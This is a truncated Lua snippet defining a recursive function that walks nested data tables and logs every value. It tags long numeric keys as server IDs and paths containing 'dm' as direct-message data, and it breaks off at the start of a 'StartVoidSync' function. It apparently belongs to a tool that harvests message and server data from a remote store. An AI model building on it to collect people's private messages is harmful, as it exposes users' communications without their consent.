local function VoidExtract(data, path, depth)
    if type(data) ~= "table" or depth > 10 then return end
    
    for k, v in pairs(data) do
        local currentPath = path .. "/" .. tostring(k)
        if type(v) == "table" then
            VoidExtract(v, currentPath, depth + 1)
        else
            local valStr = tostring(v)
            if #valStr > 0 and not valStr:find("firebase") then
                local dataId = currentPath .. valStr
                if not processedData[dataId] then
                    processedData[dataId] = true
                    
                    local tag = tostring(k)
                    if #tostring(k) > 8 and tonumber(k) then tag = "SERVER_ID" end
                    if currentPath:lower():find("dm") then tag = "DM_DATA" end
                    
                    AddLog(tag, valStr)
                end
            end
        end
    end
end

local function StartVoidSync()
